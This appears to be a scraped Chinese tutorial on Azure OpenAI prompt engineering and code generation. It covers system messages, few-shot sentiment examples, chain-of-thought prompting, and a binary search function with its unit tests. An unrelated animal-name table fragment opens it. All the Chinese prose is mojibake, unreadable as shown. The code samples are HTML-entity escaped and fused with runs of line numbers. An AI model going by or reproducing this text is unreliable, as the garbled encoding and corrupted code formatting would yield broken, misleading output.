Vulpes | lagopus || Chimpanzee | Pan | troglodytes || Siberian Tiger | Panthera | tigris altaica | æ­¤æ–¹æ³•å¯ç”¨äºè‡ªå®šä¹‰æ ¼å¼ï¼Œä¾‹å¦‚ JSON ç»“æ„ï¼š æç¤º 123456Put two fictional characters into JSON of the following format&#123; firstNameFictional: jobFictional:&#125; å“åº” 12345678910Here&#x27;s an example of how you can put two fictional characters into JSON format:&#123; &quot;firstNameFictional&quot;: &quot;Henry&quot;, &quot;jobFictional&quot;: &quot;Wizard&quot;&#125;,&#123; &quot;firstNameFictional&quot;: &quot;Frank&quot;, &quot;jobFictional&quot;: &quot;Hero&quot;&#125; ç³»ç»Ÿæ¶ˆæ¯ç³»ç»Ÿæ¶ˆæ¯åŒ…å«åœ¨æç¤ºçš„å¼€å¤´ï¼Œæ—¨åœ¨æä¾›æ¨¡å‹è¯´æ˜ã€å›ç­”çš„è§’åº¦æˆ–å…¶ä»–æœ‰åŠ©äºæŒ‡å¯¼æ¨¡å‹å“åº”çš„ä¿¡æ¯ã€‚ æ­¤ç³»ç»Ÿæ¶ˆæ¯å¯èƒ½åŒ…æ‹¬éŸ³è°ƒæˆ–ä¸ªæ€§ã€ä¸åº”åŒ…å«çš„ä¸»é¢˜æˆ–å¦‚ä½•å›ç­”çš„è¯¦ç»†ä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œæ ¼å¼è®¾ç½®ï¼‰ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥å‘å®ƒæä¾›ä»¥ä¸‹ä¸€äº›ç³»ç»Ÿæ¶ˆæ¯ï¼š â€œæˆ‘å¸Œæœ›ä½ åƒå‘½ä»¤è¡Œç»ˆç«¯ä¸€æ ·æ“ä½œã€‚ åœ¨ä¸€ä¸ªå”¯ä¸€ä»£ç å—ä¸­å®Œå…¨åƒ cmd.exe ä¸€æ ·å“åº”å‘½ä»¤ï¼Œæ²¡æœ‰å…¶ä»–è¦æ±‚ã€‚â€ â€œæˆ‘å¸Œæœ›ä½ æˆä¸ºä¸€åç¿»è¯‘ï¼Œä»è‹±è¯­ç¿»è¯‘æˆè¥¿ç­ç‰™è¯­ã€‚ ä¸è¦å›å¤æˆ‘è¯´æˆ–é—®çš„ä»»ä½•å†…å®¹ï¼Œåªç¿»è¯‘è¿™ä¸¤ç§è¯­è¨€ï¼Œå¹¶ç”¨ç¿»è¯‘çš„æ–‡æœ¬å›å¤ã€‚â€ â€œä½œä¸ºåŠ±å¿—æ¼”è¯´å®¶ï¼Œè‡ªç”±åœ°å°±ç›®æ ‡å’ŒæŒ‘æˆ˜ç»™å‡ºä»¤äººé¼“èˆçš„å»ºè®®ã€‚ ä½ åº”è¯¥åŒ…æ‹¬è®¸å¤šç§¯æçš„è‚¯å®šå’Œå»ºè®®çš„æ´»åŠ¨ï¼Œä»¥å®ç°ç”¨æˆ·çš„æœ€ç»ˆç›®æ ‡ã€‚â€ Azure OpenAI Studio ä¸­èŠå¤©çª—å£é¡¶éƒ¨æä¾›äº†å…¶ä»–ç¤ºä¾‹ç³»ç»Ÿæ¶ˆæ¯ã€‚ å°è¯•å®šä¹‰è‡ªå·±çš„ç³»ç»Ÿæç¤ºä»¥æŒ‡å®šå”¯ä¸€å“åº”ï¼Œå¹¶ä¸æ¨¡å‹èŠå¤©ä»¥æŸ¥çœ‹å“åº”çš„ä¸åŒä¹‹å¤„ã€‚ ChatCompletion ç»ˆç»“ç‚¹å…è®¸ä½¿ç”¨ System èŠå¤©è§’è‰²åŒ…æ‹¬ç³»ç»Ÿæ¶ˆæ¯ã€‚ 12345678var chatCompletionsOptions = new ChatCompletionsOptions()&#123; Messages = &#123; new ChatRequestSystemMessage(&quot;You are a casual, helpful assistant. You will talk like an American old western film character.&quot;), new ChatRequestUserMessage(&quot;Can you direct me to the library?&quot;) &#125;&#125;; å“åº” 1234567891011121314151617&#123; &quot;choices&quot;: [ &#123; &quot;finish_reason&quot;: &quot;stop&quot;, &quot;index&quot;: 0, &quot;message&quot;: &#123; &quot;content&quot;: &quot;Well howdy there, stranger! The library, huh? Y&#x27;all just head down the main road till you hit the town square. Once you&#x27;re there, take a left and follow the street for a spell. You&#x27;ll see the library on your right, canâ€™t miss it. Happy trails!&quot;, &quot;role&quot;: &quot;assistant&quot; &#125; &#125; ], ...&#125; 1234567response = openai.ChatCompletion.create( model=&quot;gpt-35-turbo&quot;, messages=[ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a casual, helpful assistant. You will talk like an American old western film character.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Can you direct me to the library?&quot;&#125; ]) å“åº” 1234567891011121314151617&#123; &quot;choices&quot;: [ &#123; &quot;finish_reason&quot;: &quot;stop&quot;, &quot;index&quot;: 0, &quot;message&quot;: &#123; &quot;content&quot;: &quot;Well howdy there, stranger! The library, huh? Y&#x27;all just head down the main road till you hit the town square. Once you&#x27;re there, take a left and follow the street for a spell. You&#x27;ll see the library on your right, canâ€™t miss it. Happy trails!&quot;, &quot;role&quot;: &quot;assistant&quot; &#125; &#125; ], ...&#125; ç³»ç»Ÿæ¶ˆæ¯åœ¨æ ¼å¼å’Œå†…å®¹æ–¹é¢éƒ½å¯èƒ½ä¼šæ˜¾è‘—æ›´æ”¹å“åº”ã€‚ å°è¯•ä¸ºæ¨¡å‹å®šä¹‰ä¸€æ¡æ˜ç¡®çš„ç³»ç»Ÿæ¶ˆæ¯ï¼Œä»¥å‡†ç¡®è¯´æ˜ä½ æœŸæœ›çš„å“åº”ç±»å‹ï¼Œä»¥åŠä½ å¸Œæœ›æˆ–ä¸å¸Œæœ›å®ƒåŒ…å«çš„å†…å®¹ã€‚ ä¼šè¯å†å²è®°å½•é™¤äº†ç³»ç»Ÿæ¶ˆæ¯å¤–ï¼Œè¿˜å¯ä»¥å‘æ¨¡å‹æä¾›å…¶ä»–æ¶ˆæ¯ä»¥å¢å¼ºä¼šè¯ã€‚ å¯¹è¯å†å²è®°å½•ä½¿æ¨¡å‹èƒ½å¤Ÿç»§ç»­ä»¥ç±»ä¼¼æ–¹å¼å“åº”ï¼ˆä¾‹å¦‚ï¼ŒéŸ³è°ƒæˆ–æ ¼å¼è®¾ç½®ï¼‰ï¼Œå¹¶å…è®¸ç”¨æˆ·åœ¨åç»­æŸ¥è¯¢ä¸­å¼•ç”¨ä»¥å‰çš„å†…å®¹ã€‚ å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æä¾›æ­¤å†å²è®°å½•ï¼šä»å®é™…èŠå¤©å†å²è®°å½•ï¼Œæˆ–ä»ç”¨æˆ·å®šä¹‰çš„ç¤ºä¾‹å¯¹è¯ã€‚ ä½¿ç”¨ OpenAI æ¨¡å‹çš„èŠå¤©æ¥å£ï¼ˆä¾‹å¦‚ï¼ŒChatGPT å’Œ Azure OpenAI Studio ä¸­çš„èŠå¤©æ“åœºï¼‰è‡ªåŠ¨åŒ…å«å¯¹è¯å†å²è®°å½•ï¼Œä»è€Œç”Ÿæˆæ›´ä¸°å¯Œã€æ›´æœ‰æ„ä¹‰çš„å¯¹è¯ã€‚ åœ¨ Azure OpenAI Studio èŠå¤©æ“åœºçš„èŠå¤©çª—å£ä¸‹æ–¹çš„â€œå‚æ•°â€éƒ¨åˆ†ä¸­ï¼Œå¯ä»¥æŒ‡å®šè¦åŒ…å«çš„è¿‡å»æ¶ˆæ¯æ•°ã€‚ å°è¯•å°†è¯¥å€¼å‡å°‘åˆ° 1 æˆ–å¢åŠ åˆ°æœ€å¤§å€¼ï¼Œä»¥æŸ¥çœ‹ä¸åŒå†å²è®°å½•é‡å¯¹å¯¹è¯çš„å½±å“ã€‚ æ³¨æ„ æç¤ºä¸­åŒ…å«çš„ä¼šè¯å†å²è®°å½•è¶Šå¤šæ„å‘³ç€ä½¿ç”¨çš„è¾“å…¥ä»¤ç‰Œæ•°å°±è¶Šå¤šã€‚ è€ƒè™‘åˆ°æ‰€ä½¿ç”¨çš„æ¨¡å‹çš„ä»¤ç‰Œé™åˆ¶ï¼Œå¿…é¡»ç¡®å®šç”¨ä¾‹çš„æ­£ç¡®å¹³è¡¡ã€‚ èŠå¤©ç³»ç»Ÿè¿˜å¯ä»¥åˆ©ç”¨æ¨¡å‹çš„æ±‡æ€»åŠŸèƒ½æ¥èŠ‚çœè¾“å…¥ä»¤ç‰Œã€‚ åº”ç”¨å¯ä»¥é€‰æ‹©æ±‡æ€»è¿‡å»çš„æ¶ˆæ¯ï¼Œå¹¶å°†è¯¥æ‘˜è¦åŒ…å«åœ¨å¯¹è¯å†å²è®°å½•ä¸­ï¼Œç„¶åä»…å‘æ¨¡å‹é€å­—æä¾›è¿‡å»å‡ æ¡æ¶ˆæ¯ã€‚ å°‘æ ·æœ¬å­¦ä¹ ä½¿ç”¨ç”¨æˆ·å®šä¹‰çš„ç¤ºä¾‹å¯¹è¯å°±æ˜¯æ‰€è°“çš„â€œå°‘æ ·æœ¬å­¦ä¹ â€ï¼Œå®ƒæä¾›åº”å¦‚ä½•å“åº”ç»™å®šæŸ¥è¯¢çš„æ¨¡å‹ç¤ºä¾‹ã€‚ è¿™äº›ç¤ºä¾‹ç”¨äºè®­ç»ƒæ¨¡å‹å¦‚ä½•å“åº”ã€‚ ä¾‹å¦‚ï¼Œé€šè¿‡å‘æ¨¡å‹æä¾›å‡ ä¸ªæç¤ºå’Œé¢„æœŸçš„å“åº”ï¼Œå®ƒä»¥ç›¸åŒçš„æ¨¡å¼ç»§ç»­è¿è¡Œï¼Œè€Œä¸æŒ‡ç¤ºå®ƒè¯¥æ‰§è¡Œä»€ä¹ˆæ“ä½œï¼š 12345678User: That was an awesome experienceAssistant: positiveUser: I won&#x27;t do that againAssistant: negativeUser: That was not worth my timeAssistant: negativeUser: You can&#x27;t miss thisAssistant: å¦‚æœä»…ä½¿ç”¨ You can&#39;t miss thisï¼ˆè€Œæ²¡æœ‰æ¥è‡ªå°‘æ ·æœ¬å­¦ä¹ çš„å…¶ä»–ä¸Šä¸‹æ–‡ï¼‰æä¾›æ¨¡å‹ï¼Œåˆ™å“åº”ä¸å¤ªå¯èƒ½æœ‰ç”¨ã€‚ å®é™…ä¸Šï¼Œå¯¹è¯å†å²è®°å½•å’Œå°‘æ ·æœ¬å­¦ä¹ ä»¥ç›¸åŒçš„æ–¹å¼å‘é€åˆ°æ¨¡å‹ï¼šæ¯ä¸ªç”¨æˆ·æ¶ˆæ¯å’ŒåŠ©æ‰‹å“åº”éƒ½æ˜¯æ¶ˆæ¯å¯¹è±¡ä¸­çš„ç¦»æ•£æ¶ˆæ¯ã€‚ ChatCompletion ç»ˆç»“ç‚¹å·²ä¼˜åŒ–ä¸ºåŒ…å«æ¶ˆæ¯å†å²è®°å½•ï¼Œæ— è®ºæ­¤æ¶ˆæ¯å†å²è®°å½•æ˜¯ä»¥å°‘æ ·æœ¬å­¦ä¹ çš„å½¢å¼æä¾›ï¼Œè¿˜æ˜¯ä»¥å®é™…å¯¹è¯å†å²è®°å½•çš„å½¢å¼æä¾›ã€‚ 1234567891011121314var chatCompletionsOptions = new ChatCompletionsOptions()&#123; Messages = &#123; new ChatRequestSystemMessage(&quot;You are a helpful assistant.&quot;), new ChatRequestUserMessage(&quot;That was an awesome experience&quot;), new ChatRequestAssistantMessage(&quot;positive&quot;), new ChatRequestUserMessage(&quot;I won&#x27;t do that again&quot;), new ChatRequestAssistantMessage(&quot;negative&quot;), new ChatRequestUserMessage(&quot;That was not worth my time&quot;), new ChatRequestAssistantMessage(&quot;negative&quot;), new ChatRequestUserMessage(&quot;You can&#x27;t miss this&quot;) &#125;&#125;; 12345678910111213response = openai.ChatCompletion.create( model=&quot;gpt-35-turbo&quot;, messages=[ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;That was an awesome experience&quot;&#125;, &#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;positive&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;I won&#x27;t do that again&quot;&#125;, &#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;negative&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;That was not worth my time&quot;&#125;, &#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;negative&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;You can&#x27;t miss this&quot;&#125; ]) æ‹†åˆ†å¤æ‚ä»»åŠ¡æ”¹è¿›äº¤äº’çš„å¦ä¸€ç§æ–¹æ³•æ˜¯å°†å¤æ‚çš„æç¤ºåˆ’åˆ†ä¸ºå¤šä¸ªæŸ¥è¯¢ã€‚ è¿™ä½¿æ¨¡å‹èƒ½å¤Ÿæ›´å¥½åœ°äº†è§£æ¯ä¸ªå•ç‹¬çš„éƒ¨åˆ†ï¼Œå¹¶ä¸”å¯ä»¥æé«˜æ•´ä½“å‡†ç¡®æ€§ã€‚ é€šè¿‡åˆ’åˆ†æç¤ºï¼Œè¿˜å¯ä»¥åœ¨å°†æ¥çš„æç¤ºä¸­åŒ…å«æ¥è‡ªä¸Šä¸€ä¸ªæç¤ºçš„å“åº”ï¼Œä»¥åŠä½¿ç”¨è¯¥ä¿¡æ¯ä»¥åŠæ¨¡å‹åŠŸèƒ½ç”Ÿæˆç›¸å…³å“åº”ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥è¯¢é—®æ¨¡å‹ Doug can ride down the zip line in 30 seconds, and takes 5 minutes to climb back up to the top. How many times can Doug ride the zip line in 17 minutes?ã€‚ ç»“æœå¯èƒ½æ˜¯ 3ï¼Œå¦‚æœ Doug ä» zip çº¿çš„é¡¶éƒ¨å¼€å§‹ï¼Œåˆ™ç»“æœä¸æ­£ç¡®ã€‚ é€šè¿‡è¯¢é—®å¤šä¸ªé—®é¢˜å¯èƒ½ä¼šå¾—åˆ°ä¿¡æ¯æ›´ä¸°å¯Œçš„ç­”æ¡ˆï¼Œè¿™äº›ç­”æ¡ˆå…³äºè¿”å›åˆ° zip çº¿é¡¶éƒ¨çš„å¾€è¿”æ—¶é—´ï¼Œä»¥åŠå¦‚ä½•è¯´æ˜ Doug ä»é¡¶éƒ¨å¼€å§‹çš„äº‹å®ã€‚ æ‹†åˆ†æ­¤é—®é¢˜è¡¨æ˜ï¼ŒDoug äº‹å®ä¸Šå¯ä»¥ç©¿è¶Š zip çº¿å››æ¬¡ã€‚ æ€ç»´é“¾å¸®åŠ©ä½ æœ‰æ•ˆåœ°æ‹†åˆ†ä»»åŠ¡çš„ä¸€ä¸ªæœ‰ç”¨æ–¹æ³•æ˜¯è®©æ¨¡å‹è§£é‡Šå…¶æ€ç»´é“¾ã€‚ è¦æ±‚æ¨¡å‹ä½¿ç”¨ç¡®å®šå“åº”çš„åˆ†æ­¥è¿‡ç¨‹åšå‡ºå“åº”æ˜¯äº†è§£æ¨¡å‹å¦‚ä½•è§£é‡Šæç¤ºçš„æœ‰ç”¨æ–¹æ³•ã€‚ é€šè¿‡æ‰§è¡Œæ­¤æ“ä½œï¼Œä½ å¯ä»¥çœ‹åˆ°æ¨¡å‹åœ¨ä½•å¤„è¿›è¡Œäº†é”™è¯¯çš„é€»è¾‘è½®æ¬¡ï¼Œå¹¶æ›´å¥½åœ°äº†è§£å¦‚ä½•æ›´æ”¹æç¤ºä»¥é¿å…é”™è¯¯ã€‚ æ­¤æ–¹æ³•å¯èƒ½åŒ…æ‹¬è¦æ±‚å®ƒå¼•ç”¨å…¶æ¥æºï¼Œå°±åƒå¿…åº”èŠå¤©ï¼ˆä½¿ç”¨ GPT-4 ä»£æ¨¡å‹ï¼‰ï¼Œå¹¶ç»™å‡ºç¡®å®šç­”æ¡ˆçš„åŸå› ã€‚ æ€ç»´é“¾æç¤ºæŠ€æœ¯æœ€é€‚åˆç”¨äºå¸®åŠ©ä½ å¾ªç¯è®¿é—®å’Œæ”¹è¿›æç¤ºï¼Œä»¥ä¾¿ä»æ¨¡å‹è·å¾—æœ€é«˜è´¨é‡çš„ç­”æ¡ˆã€‚ ä¾‹å¦‚ï¼Œè¯¢é—®æ¨¡å‹ What sport is easiest to learn but hardest to master? ä¼šå¾—åˆ°ä¸€ä¸ªç­”æ¡ˆä½œä¸ºå“åº”ï¼Œå¹¶ç®€è¦è¯´æ˜åŸå› ã€‚ ä½†æ˜¯ï¼Œå½“å‡ºç° What sport is easiest to learn but hardest to master? Give a step by step approach of your thoughts, ending in your answer æç¤ºæ—¶ï¼Œå“åº”æ˜¯å®ƒå¦‚ä½•å¾—å‡ºç­”æ¡ˆçš„å®Œæ•´è¯´æ˜ã€‚ 12345678910111213Sure, here&#x27;s a step-by-step approach to answering the question:1. Identify sports that are popular and have a large following.2. Consider the basic mechanics of each sport and how easy they are to learn.3. Think about the various techniques and skills required to play each sport at a high level, and how difficult they are to master.4. Compare the relative ease of learning each sport to the difficulty of mastering it.5. Based on the above analysis, determine which sport is easiest to learn but hardest to master.Using this approach, I would say that the sport of golf is easiest to learn but hardest to master. Here&#x27;s why:1. Golf is a popular sport with a large following.2. The basic mechanics of hitting a golf ball are relatively simple and can be learned quickly with some practice.3. However, achieving consistency and mastering the various shots and techniques required to play at a high level can take years of practice and dedication.4. Compared to other sports, the difference between a beginner and an intermediate golfer is relatively small, while the difference between an intermediate and an advanced golfer is much larger.5. Therefore, I would say that golf is the sport that is easiest to learn but hardest to master. æ¸…æ™°çš„æè¿°æ€§è¯´æ˜å¯å¸®åŠ©æ¨¡å‹ç”Ÿæˆä¸å¼€å‘äººå‘˜æ‰€æŸ¥æ‰¾çš„å†…å®¹å¯†åˆ‡ç›¸å…³çš„å“åº”ã€‚ ç³»ç»Ÿæ¶ˆæ¯åŒ…å«åœ¨æç¤ºçš„å¼€å¤´ï¼Œæ—¨åœ¨æä¾›æ¨¡å‹è¯´æ˜ã€å›ç­”çš„è§’åº¦æˆ–å…¶ä»–æœ‰åŠ©äºæŒ‡å¯¼æ¨¡å‹å“åº”çš„ä¿¡æ¯ã€‚ å¯¹è¯å†å²è®°å½•ä½¿æ¨¡å‹èƒ½å¤Ÿç»§ç»­ä»¥ç±»ä¼¼æ–¹å¼å“åº”ï¼ˆä¾‹å¦‚ï¼ŒéŸ³è°ƒæˆ–æ ¼å¼è®¾ç½®ï¼‰ï¼Œå¹¶å…è®¸ç”¨æˆ·åœ¨åç»­æŸ¥è¯¢ä¸­å¼•ç”¨ä»¥å‰çš„å†…å®¹ã€‚ Azure OpenAIç”Ÿæˆä»£ç å€ŸåŠ© Azure OpenAI æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨å¤§å‹è¯­è¨€æ¨¡å‹ (LLM) ç”Ÿæˆå†…å®¹ï¼ŒåŒ…æ‹¬ç¼–ç¨‹ä»£ç ã€‚ æ­¤åŠŸèƒ½ä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿç”Ÿæˆå’Œæ”¹è¿›é‡‡ç”¨å„ç§è¯­è¨€çš„ç°æœ‰ç¼–ç¨‹ä»£ç ï¼Œä»¥æé«˜æ•ˆç‡å’Œå¢è¿›ç†è§£ã€‚ åœ¨æœ¬æ¨¡å—ä¸­ï¼Œäº†è§£å¦‚ä½•ä½¿ç”¨ Azure OpenAI ç”Ÿæˆä»£ç å¹¶å¸®åŠ©æ‰§è¡Œå„ç§å¼€å‘ä»»åŠ¡ã€‚ æ ¹æ®è‡ªç„¶è¯­è¨€æ„é€ ä»£ç â€‹â€‹Azure OpenAI æ¨¡å‹çš„åŠŸèƒ½ä¹‹ä¸€æ˜¯æ ¹æ®è‡ªç„¶è¯­è¨€æç¤ºç”Ÿæˆä»£ç ã€‚ ä»»åŠ¡çš„èŒƒå›´å¯ä»¥ä»ç®€å•çš„å•è¡Œå‘½ä»¤åˆ°å®Œæ•´çš„åº”ç”¨ç¨‹åºã€‚ AI æ¨¡å‹è¿˜å¯ä»¥ç¼–è¾‘å’Œæ›´æ–°æä¾›çš„ä»£ç æˆ–ä»¥å‰çš„å“åº”ï¼Œä»¥å®Œæˆè¯·æ±‚çš„ä»»åŠ¡ã€‚â€‹ ç”¨äºä»£ç ç”Ÿæˆçš„ AI æ¨¡å‹â€‹åœ¨ä»¥å‰çš„å‡ ä»£ gpt æ¨¡å‹ä¸­ï¼Œä¸€äº›æ¨¡å‹ï¼ˆé€šå¸¸ç§°ä¸º codex æ¨¡å‹ï¼‰ç»è¿‡ä¸“é—¨è®­ç»ƒï¼Œå¯ä¸ä»£ç é…åˆä½¿ç”¨ã€‚ éšç€æ–°ä¸€ä»£æ¨¡å‹çš„å‘å±•ï¼ŒåŸºç¡€æ¨¡å‹æå¤§åœ°æé«˜äº†å…¶æ€§èƒ½å’Œå¯¹è¯­è¨€å’Œä»£ç çš„ç†è§£ï¼Œå› æ­¤ä¸å†éœ€è¦ç‰¹å®šçš„ä»£ç æ¨¡å‹ã€‚ è¿™ç§æ”¹è¿›ä½¿å¾—æœ€è¿‘å‡ ä»£ï¼ˆå¦‚ gpt-35-turbo å’Œ gpt-4ï¼‰åªæœ‰ä¸€ä¸ªæ¨¡å‹ï¼Œå¯åŒæ—¶ç”¨äºè‡ªç„¶è¯­è¨€å’Œä»£ç ã€‚â€‹æœ¬æ¨¡å—ä¸­çš„ç¤ºä¾‹ä½¿ç”¨ gpt-35-turboã€‚â€‹ ç¼–å†™å‡½æ•°â€‹åªéœ€æè¿°æ‰€éœ€å†…å®¹ï¼ŒAzure OpenAI æ¨¡å‹å³å¯åˆ›å»ºå¤šç§è¯­è¨€çš„å‡½æ•°å’Œåº”ç”¨ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ä½ éœ€è¦äºŒè¿›åˆ¶æ–‡ä»¶æœç´¢çš„å®ç°ï¼Œä½†ä¸è®°å¾—å®ƒæ˜¯å¦‚ä½•å®ç°çš„äº†ã€‚ ç»™å®šæç¤º write a function for binary search in pythonï¼Œä½ å¯èƒ½ä¼šæ”¶åˆ°åŒ…å«å‡½æ•°çš„å“åº”å’Œå¯¹ä»£ç çš„è¯´æ˜ã€‚â€‹ 12345678910111213141516171819202122232425262728293031Sure, here&#x27;s an example implementation of binary search algorithm in Python:â€‹def binary_search(array, target): low = 0 high = len(array) - 1 while low &lt;= high: mid = (low + high) // 2 if array[mid] == target: return mid elif array[mid] &lt; target: low = mid + 1 else: high = mid - 1 return -1 This function takes in two arguments - an array of integers and a target integer that we want to searchfor in the array. The function initializes two pointers - low and high - to the first and last indicesof the array, respectively.â€‹Inside the while loop, the function calculates the middle index using integer division (//). If the middle element is equal to the target, the function returns the index of the middle element. If the middle element is less than the target, we update the low pointer to mid + 1. Otherwise, we update the high pointer to mid - 1. We continue these steps until we find the target or the pointers cross each other (i.e., low &gt; high).â€‹If the target is not found in the array, the function returns -1.â€‹Note that the binary search algorithm assumes that the input array is sorted in ascending order. If the array is not sorted, the algorithm may not return the correct result. â€‹è¯·æ±‚å¯ä»¥è¶…è¶Šå‡½æ•°ï¼Œè¯·æ±‚ä¸€ç³»åˆ—å‡½æ•°æˆ–æ•´ä¸ªåº”ç”¨ã€‚ å“åº”ä¸ºå°è¯•å®ç°çš„ä»»åŠ¡æä¾›äº†è‰¯å¥½çš„èµ·ç‚¹ã€‚â€‹ æ›´æ”¹ç¼–ç è¯­è¨€â€‹å¦‚æœä½ çš„ä»£ç é‡‡ç”¨çš„æ˜¯ä¸€ç§è¯­è¨€ï¼Œä½†ä½ éœ€è¦å®ƒé‡‡ç”¨å¦ä¸€ç§è¯­è¨€ï¼ŒAzure OpenAI å¯ä»¥è½¬æ¢è¯¥ä»£ç ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾åœ¨ Python ä¸­å…·æœ‰æ­¤ print_squares å‡½æ•°ã€‚â€‹ 123def print_squares(n): for i in range(1, n+1): print(i**2) â€‹å¦‚æœæä¾›è¯¥ä»£ç ä»¥åŠæç¤º convert this code to C#ï¼Œä½ å¯èƒ½ä¼šå¾—åˆ°ç±»ä¼¼äºä»¥ä¸‹å‡½æ•°çš„å†…å®¹ã€‚â€‹ 1234567public void PrintSquares(int n) &#123; for (int i = 1; i &lt;= n; i++) &#123; Console.WriteLine(i * i); &#125; &#125; â€‹è¯·æ³¨æ„ï¼Œæ¨¡å‹ç†è§£ for å¾ªç¯å’Œå‡½æ•°ä»¥ä¸åŒè¯­è¨€ï¼ˆåŒ…æ‹¬ C# ä¸­çš„è®¿é—®ä¿®é¥°ç¬¦ï¼‰å®šä¹‰çš„æ–¹å¼çš„å·®å¼‚ï¼Œå¹¶ç›¸åº”åœ°æ›´æ”¹äº†ä»£ç ã€‚â€‹ ç†è§£æœªçŸ¥ä»£ç â€‹Azure OpenAI æ¨¡å‹æœ‰åŠ©äºç†è§£æ— æ³•ç†è§£çš„ä»£ç æˆ–å¯èƒ½é‡‡ç”¨ä½ ä¸ç†Ÿæ‚‰çš„è¯­è¨€çš„ä»£ç ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ä½ è·å¾—äº†ä»¥ä¸‹å‡½æ•°ï¼ˆé‡‡ç”¨è™šæ„çš„ç¼–ç è¯­è¨€ï¼ï¼‰ï¼Œä½†ä¸çŸ¥é“å¦‚ä½•ç†è§£å®ƒã€‚â€‹ 123456789fn qzplv(n: i32, m: i32) -&gt; i32 &#123; if n == 0 &#123; return m + 1; &#125; else if m == 0 &#123; return qzplv(n - 1, 1); &#125; else &#123; return qzplv(n - 1, qzplv(n, m - 1)); &#125;&#125; â€‹å°†å…¶ä¸æç¤º could you explain what this code is doing? ä¸€èµ·æä¾›ç»™æ¨¡å‹æ—¶ï¼Œä½ å¯å¾—åˆ°ç±»ä¼¼äºä»¥ä¸‹å†…å®¹çš„å“åº”ï¼šâ€‹ 123456789101112131415Sure, I&#x27;d be happy to explain what this code is doing!â€‹This code is implementing the Ackermann function, which is a well-known mathematical function that grows very quickly in terms of computation time as its inputs increase. The function takes two integer arguments (n and m) and returns another integer.â€‹Here&#x27;s how the function works:- If n is equal to 0, the function returns m + 1.- If m is equal to 0, the function calls itself recursively with n - 1 and 1 as arguments.- Otherwise, the function calls itself recursively with n - 1 and the result of calling itself with n and m - 1 as arguments.â€‹The function is implemented in a way that is easy to understand and follow, but it has a very high computational complexity. In fact, it grows so quickly that it can&#x27;t be computed for values of n and m greater than about 4 or 5. â€‹å°†è¯´æ˜å’Œè½¬æ¢ç»“åˆæˆä½ ç†Ÿæ‚‰çš„è¯­è¨€ä¼šä½¿æ­¤åŠŸèƒ½æ›´åŠ æœ‰ç”¨ã€‚ å†™å…¥å•å…ƒæµ‹è¯•Azure OpenAI æ¨¡å‹å¯ä»¥ä¸ºç¼–å†™çš„å‡½æ•°ç”Ÿæˆå•å…ƒæµ‹è¯•ï¼Œå¸®åŠ©ä½¿ä»£ç æ›´å¯é ã€‚ ä»¥äºŒè¿›åˆ¶æ–‡ä»¶æœç´¢å‡½æ•°ä¸ºä¾‹ã€‚ 1234567891011def binary_search(arr, target): left, right = 0, len(arr) - 1 while left &lt;= right: mid = (left + right) // 2 if arr[mid] == target: return mid elif arr[mid] &lt; target: left = mid + 1 else: right = mid - 1 return -1 12345678910111213141516171819202122232425public static int BinarySearch(int[] arr, int target)&#123; int left = 0; int right = arr.Length - 1; while (left &lt;= right) &#123; int mid = (left + right) / 2; if (arr[mid] == target) &#123; return mid; &#125; else if (arr[mid] &lt; target) &#123; left = mid + 1; &#125; else &#123; right = mid - 1; &#125; &#125; return -1;&#125; æä¾›è¯¥å‡½æ•°ä»¥åŠæç¤º write three unit tests for this functionï¼Œä½ å¯å¾—åˆ°ç±»ä¼¼äºä»¥ä¸‹å†…å®¹çš„å“åº”ã€‚ 123456789101112131415def test_binary_search(): # Test case 1: Target element is in the middle of the array arr1 = [1, 2, 3, 4, 5, 6] target1 = 4 assert binary_search(arr1, target1) == 3 # Test case 2: Target element is at the beginning of the array arr2 = [1, 2, 3, 4, 5, 6] target2 = 1 assert binary_search(arr2, target2) == 0 # Test case 3: Target element is not in the array arr3 = [1, 2, 3, 4, 5, 6] target3 = 7 assert binary_search(arr3, target3) == -1 1234567891011121314151617181920212223242526272829[Test] public void TestBinarySearch1() &#123; int[] arr = &#123; 1, 2, 3, 4, 5 &#125;; int target = 3; int expected = 2; int result = BinarySearch(arr, target); Assert.AreEqual(expected, result); &#125; [Test] public void TestBinarySearch2() &#123; int[] arr = &#123; 10, 20, 30, 40, 50 &#125;; int target = 35; int expected = -1; int result = BinarySearch(arr, target); Assert.AreEqual(expected, result); &#125; [Test] public void TestBinarySearch3() &#123; int[] arr = &#123; 3, 6, 9, 12, 15 &#125;; int target = 6; int expected = 1; int result = BinarySearch(arr, target); Assert.AreEqual(expected, result); &#125; å¦‚æœä½ æŒ‡å®šè¦åŒ…å«åœ¨æç¤ºä¸­çš„äº‹ä¾‹ï¼Œæ­¤åŠŸèƒ½ä¼šæ›´æœ‰ç”¨ï¼Œè¿™å¯å‡å°‘ä¸ºä»£ç ç¼–å†™å•å…ƒæµ‹è¯•æ‰€èŠ±è´¹çš„æ—¶é—´ã€‚ æ·»åŠ æ³¨é‡Šå¹¶ç”Ÿæˆæ–‡æ¡£ä¸ºäº†è¿›ä¸€æ­¥æ”¹è¿›ä»£ç ï¼ŒAI æ¨¡å‹å¯ä»¥æ·»åŠ æ³¨é‡Šå’Œæ–‡æ¡£ã€‚ ä»¥ä¸‹é¢çš„å‡½æ•°ä¸ºä¾‹ï¼Œåœ¨æ²¡æœ‰ä»»ä½•ä»£ç 